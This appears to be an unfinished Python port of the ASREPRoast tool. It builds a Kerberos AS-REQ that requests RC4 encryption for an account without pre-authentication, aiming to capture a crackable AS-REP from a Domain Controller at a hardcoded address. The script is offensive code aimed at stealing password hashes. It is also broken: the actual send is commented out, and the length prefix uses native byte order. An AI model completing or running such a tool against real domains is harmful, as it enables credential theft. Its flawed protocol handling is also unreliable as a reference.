"""
Reference: https://github.com/HarmJ0y/ASREPRoast/blob/21c4ea5a0e2a70ea51a4763df8308ec8e4b233f0/ASREPRoast.ps1#L496-L571
Steps:
    1. Create a KRB_KDC_REQ message of type KRB_AS_REQ (Authentication Service Request) to send to the Domain Controller
        1. ref. https://www.freesoft.org/CIE/RFC/1510/55.htm
        2. ref. https://github.com/tiran/kkdcpasn1
    2. Embed this message inside an ASN.1 structure
    3. Send the data to the KDC (Domain Controller)
    4. Cature the response (ASREP, or "Authentication Service Response") and parse it
        1. ref. https://www.freesoft.org/CIE/RFC/1510/56.htm
        2. ref. Wireshark
"""

import asn1tools
import datetime
import socket
import struct

username = ''
domain = ''

def main():
    asreq_format_compiled = asn1tools.compile_files('asreq.asn')
    asreq_data_encoded = asreq_format_compiled.encode('AS-REQ', {
        'pvno': 5,
        'msg-type': 10,
        'req-body': {
            'kdc-options': (b'\x40\x80\x00\x10', 32),
            'cname': {
                'name-type': 1,
                'name-string': [username]
            },
            'realm': domain,
            'sname': {
                'name-type': 2,
                'name-string': ['krbtgt', domain]
            },
            'till': datetime.datetime(1601, 1, 1),
            'nonce': 12381973,
            'etype': [23]
        },
    })

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.10", 88))

    print(f"[+] Length of the ASREQ message: {len(asreq_data_encoded)}")
    s.send(struct.pack("i", len(asreq_data_encoded)))

    # TODO: after sending the length of the message the server closes the stream
    #   perhaps it expects cryptography 
    # s.send(asreq_data_encoded)
    # print(s.recv(1))


if __name__ == "__main__":
    main()